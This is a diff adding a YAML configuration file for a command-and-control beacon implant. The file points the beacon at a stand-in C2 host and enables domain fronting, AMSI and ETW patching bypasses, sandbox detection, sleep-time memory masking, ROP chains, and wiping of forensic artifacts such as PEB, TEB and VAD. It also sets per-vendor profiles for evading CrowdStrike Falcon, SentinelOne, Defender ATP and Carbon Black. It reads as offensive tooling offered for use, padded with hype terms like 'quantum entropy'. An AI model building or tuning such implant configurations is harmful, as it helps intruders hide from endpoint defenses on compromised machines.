@@ -1,0 +1,205 @@
+# Beacon Configuration - Elite Sleepmask Cloaking
+# Ultimate Edition with AI-Dynamic Memory Cloaking
+
+# Basic beacon settings
+beacon:
+  id: ""  # Auto-generated if empty
+  c2_host: "c2.example.com"
+  c2_port: 443
+  use_https: true
+  sleep_time: 60  # Base sleep in seconds
+  jitter_percent: 40
+  max_retries: 3
+
+# Kill date and working hours (OPSEC)
+opsec:
+  kill_date: null  # Format: YYYY-MM-DD or null
+  working_hours:
+    enabled: false
+    start_hour: 9
+    end_hour: 17
+    timezone: "local"
+
+# Network configuration
+network:
+  proxy: null  # http://proxy:8080 or null
+  domain_fronting:
+    enabled: false
+    front_host: "cdn.example.com"
+    actual_host: "c2.example.com"
+  traffic_profile: "google_search"  # google_search, microsoft_update, aws_api
+  user_agent_rotation: true
+  tls_fingerprint_rotation: true
+
+# Evasion settings
+evasion:
+  level: 3  # 1=basic, 2=medium, 3=high, 4=paranoid
+  
+  # Sleep obfuscation
+  sleep:
+    enabled: true
+    pattern: "adaptive"  # gaussian, fibonacci, poisson, ml_entropy, adaptive
+    memory_obfuscation: true
+    syscall_jitter: true
+  
+  # AMSI/ETW bypass
+  amsi_bypass:
+    enabled: true
+    technique: "ai_select"  # reflection, memory_patch, ai_select
+  
+  etw_bypass:
+    enabled: true
+    technique: "patch"  # patch, provider_blind, ai_select
+  
+  # Anti-sandbox
+  sandbox_detection:
+    enabled: true
+    action: "exit"  # exit, sleep, continue
+
+# === NEW: Sleepmask Cloaking Elite Settings ===
+sleepmask_cloaking:
+  enabled: true
+  
+  # AI-Dynamic selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Cloak level: NONE, BASIC, STANDARD, ADVANCED, ELITE, PARANOID
+  cloak_level: "ELITE"
+  
+  # Multi-stage masking
+  multi_stage:
+    enabled: true
+    stages:
+      - "decrypt"
+      - "execute"
+      - "remask"
+      - "cleanup"
+      - "verify"
+  
+  # ROP gadget chain
+  rop_chain:
+    enabled: true
+    gadget_density: 0.5  # 0.0-1.0 (higher = more gadgets)
+    runtime_build: true
+    mutation: true  # Mutate gadgets each cycle
+  
+  # Quantum entropy
+  entropy:
+    enabled: true
+    pool_size: 64
+    reseed_interval: 100  # Reseed after N operations
+    target_entropy: 6.5  # Stay below EDR detection threshold (7.5)
+  
+  # Memory masking
+  memory_mask:
+    algorithm: "xor"  # xor, aes, chacha20
+    key_rotation: true
+    key_size: 32  # bytes
+    mask_code_regions: true
+    mask_heap_regions: true
+  
+  # OPSEC layer
+  opsec:
+    # Heap spoofing
+    heap_spoof:
+      enabled: true
+      decoy_count: 15
+      patterns:
+        - "pe_header"
+        - "bitmap"
+        - "json"
+        - "xml"
+        - "certificate"
+    
+    # Forensic artifact wipe
+    artifact_wipe:
+      enabled: true
+      targets:
+        - "peb"           # Process Environment Block
+        - "teb"           # Thread Environment Block
+        - "heap_metadata" # Heap tracking data
+        - "string_refs"   # String references
+        - "module_list"   # Loaded module list
+        - "vad"           # Virtual Address Descriptors
+    
+    # Timing evasion
+    timing:
+      mask_before_scan: true
+      scan_interval_factor: 0.5  # Mask at half the EDR scan interval
+      jitter_percent: 40
+  
+  # Remask cycle settings
+  remask:
+    enabled: true
+    interval: 30  # Remask every N seconds during sleep
+    new_key_each_cycle: true
+    rotate_decoys: true
+    rotate_percent: 33  # Rotate 33% of decoys each cycle
+
+# EDR-specific overrides (auto-applied when EDR detected)
+edr_profiles:
+  crowdstrike_falcon:
+    cloak_level: "ELITE"
+    rop_chain:
+      gadget_density: 0.5
+    heap_spoof:
+      decoy_count: 20
+    artifact_wipe:
+      targets:
+        - "heap_metadata"
+        - "peb"
+        - "teb"
+        - "vad"
+    timing:
+      scan_interval_factor: 0.3  # Falcon scans frequently
+  
+  sentinelone:
+    cloak_level: "ELITE"
+    rop_chain:
+      gadget_density: 0.7  # S1 needs heavy ROP
+    heap_spoof:
+      decoy_count: 25
+    artifact_wipe:
+      targets:
+        - "vad"
+        - "heap_metadata"
+        - "module_list"
+        - "thread_context"
+    timing:
+      scan_interval_factor: 0.25
+  
+  defender_atp:
+    cloak_level: "ADVANCED"
+    rop_chain:
+      gadget_density: 0.3
+    entropy:
+      target_entropy: 6.0  # Defender has higher entropy sensitivity
+    heap_spoof:
+      decoy_count: 15
+    timing:
+      scan_interval_factor: 0.4
+  
+  carbon_black:
+    cloak_level: "ADVANCED"
+    rop_chain:
+      gadget_density: 0.4
+    heap_spoof:
+      decoy_count: 15
+    timing:
+      scan_interval_factor: 0.35
+  
+  none:
+    cloak_level: "STANDARD"
+    rop_chain:
+      enabled: false
+    heap_spoof:
+      decoy_count: 5
+    artifact_wipe:
+      enabled: false
+
+# Logging
+logging:
+  enabled: false
+  level: "WARNING"  # DEBUG, INFO, WARNING, ERROR
+  file: null  # Log file path or null for no file
